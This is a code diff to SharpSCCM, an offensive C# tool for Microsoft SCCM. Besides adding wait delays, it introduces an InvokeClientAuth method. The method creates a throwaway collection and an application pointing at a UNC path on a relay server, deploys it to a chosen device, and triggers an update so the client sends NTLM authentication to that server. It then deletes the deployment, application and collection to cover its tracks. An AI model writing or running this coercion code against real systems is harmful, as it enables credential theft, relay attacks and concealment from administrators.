@@ -20,6 +20,8 @@ namespace SharpSCCM
                 collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
             }
             Console.WriteLine($"[+] Added {deviceName} to {collectionName}");
+            Console.WriteLine("[+] Waiting 15s for collection to populate");
+            System.Threading.Thread.Sleep(15000);
             GetCollectionMember(scope, collectionName, false, null, null, false, false);
         }
 
@@ -37,6 +39,8 @@ namespace SharpSCCM
                 collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
             }
             Console.WriteLine($"[+] Added {userName} to {collectionName}");
+            Console.WriteLine("[+] Waiting 10s for collection to populate");
+            System.Threading.Thread.Sleep(10000);
             GetCollectionMember(scope, collectionName, false, null, null, false, false);
         }
 
@@ -132,6 +136,45 @@ namespace SharpSCCM
 
                 }
             }
+        }
+        public static void InvokeClientAuth (ManagementScope scope, string deviceName = null, string collectionName = null, string relayServer = null, bool runAsUser = true)
+        {
+            if ((String.IsNullOrEmpty(deviceName) && String.IsNullOrEmpty(collectionName)) || (!String.IsNullOrEmpty(deviceName) && !String.IsNullOrEmpty(collectionName)))
+            {
+                Console.WriteLine("[!] You must specify either a device or existing collection.");
+            }
+            else
+            {
+                if (!String.IsNullOrEmpty(deviceName))
+                {
+                        string newCollectionName = $"Devices_{Guid.NewGuid().ToString()}";
+                        string newApplicationName = $"Application_{Guid.NewGuid().ToString()}";
+                        NewCollection(scope, "device", newCollectionName);
+                        AddDeviceToCollection(scope, deviceName, newCollectionName);
+                        NewApplication(scope, newApplicationName, $"\\\\{relayServer}\\C$", runAsUser, true);
+                        NewDeployment(scope, newApplicationName, newCollectionName);
+                        Console.WriteLine("[+] Waiting 30s for new deployment to become available");
+                        System.Threading.Thread.Sleep(30000);
+                        InvokeUpdate(scope, newCollectionName);
+                        Console.WriteLine("[+] Waiting 1m for NTLM authentication");
+                        System.Threading.Thread.Sleep(60000);
+                        Console.WriteLine("[+] Cleaning up");
+                        Cleanup.RemoveDeployment(scope, newApplicationName, newCollectionName);
+                        Cleanup.RemoveApplication(scope, newApplicationName);
+                        Cleanup.RemoveCollection(scope, newCollectionName);
+                        Console.WriteLine("[+] Done!");
+                }
+                else
+                // If a collection is specified instead of a device
+                {
+
+                }
+            }
+        }
+        
+        public static void InvokeLastLogonUpdate(ManagementScope scope, string collectionName)
+        {
+            // TO DO
         }
 
         public static void InvokeUpdate(ManagementScope scope, string collectionName)
